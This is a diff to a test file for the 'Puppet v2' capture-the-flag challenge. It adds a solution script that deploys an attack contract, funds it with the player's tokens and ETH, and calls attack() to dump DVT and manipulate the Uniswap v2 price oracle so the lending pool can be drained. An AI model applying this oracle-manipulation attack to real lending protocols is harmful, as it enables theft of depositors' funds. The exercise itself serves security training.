@@ -13,6 +13,8 @@ describe('[Challenge] Puppet v2', function () {
     // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
     const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;
     const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n;
+    // @audit-info 1DVT = ~0.1 ETH
+    // @audit-info After we dump DVT: 1DVT = ~0.001 ETH
 
     const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
     const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;
@@ -83,6 +85,15 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        const AttackerContractFactory = await ethers.getContractFactory("AttackPuppetV2", player);
+        this.attackerContract = await AttackerContractFactory.deploy(
+            lendingPool.address, uniswapRouter.address, token.address
+        )
+
+        await token.connect(player).transfer(this.attackerContract.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await this.attackerContract.attack({value: PLAYER_INITIAL_ETH_BALANCE - 4n * 10n ** 17n});
+        
     });
 
     after(async function () {
